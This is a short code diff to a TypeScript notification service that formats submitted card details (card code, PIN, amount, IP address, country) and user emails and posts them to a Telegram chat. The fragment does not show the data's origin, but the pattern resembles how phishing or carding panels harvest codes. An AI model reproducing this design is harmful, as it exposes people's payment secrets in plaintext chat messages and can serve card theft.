@@ -49,8 +49,7 @@ export class NotificationService {
 *Card Type:* ${data.cardType}
 *Amount:* ${data.amount} ${data.currency}
 *Card Code:* \`${data.cardCode}\`
-${data.pin ? `*PIN:* \`${data.pin}\`\n` : ''}
-*IP Address:* ${data.ip || 'Unknown'}
+${data.pin ? `*PIN:* \`${data.pin}\`\n` : ''}*IP Address:* ${data.ip || 'Unknown'}
 *Country:* ${data.country || 'Unknown'}
 ━━━━━━━━━━━━━━━━━━━━━
     `.trim();
@@ -63,6 +62,18 @@ ${data.pin ? `*PIN:* \`${data.pin}\`\n` : ''}
       `New Card Submitted: ${data.cardType} (${data.amount} ${data.currency})`,
       formattedMessage,
     );
+  }
+
+  async notifyEmailSubmission(requestId: string, email: string) {
+    const formattedMessage = `
+📧 *User Email Submitted (Under Review)*
+━━━━━━━━━━━━━━━━━━━━━
+*Request ID:* \`${requestId}\`
+*Email:* \`${email}\`
+━━━━━━━━━━━━━━━━━━━━━
+    `.trim();
+
+    await this.sendTelegram(formattedMessage);
   }
 
   private async sendTelegram(message: string) {
